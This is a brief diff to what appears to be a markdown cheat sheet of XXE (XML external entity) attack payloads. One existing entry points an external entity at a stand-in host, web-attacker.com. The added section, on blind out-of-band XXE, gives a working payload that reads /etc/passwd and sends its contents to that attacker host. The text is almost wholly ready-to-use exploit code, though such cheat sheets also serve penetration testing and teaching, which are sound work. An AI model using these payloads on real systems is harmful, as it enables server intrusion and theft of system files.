@@ -116,3 +116,11 @@ Bypass filtering and validation:
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
 <stockCheck><productId>1</productId></stockCheck>
 ```
+
+### Exploiting blind XXE to exfiltrate data out-of-band
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
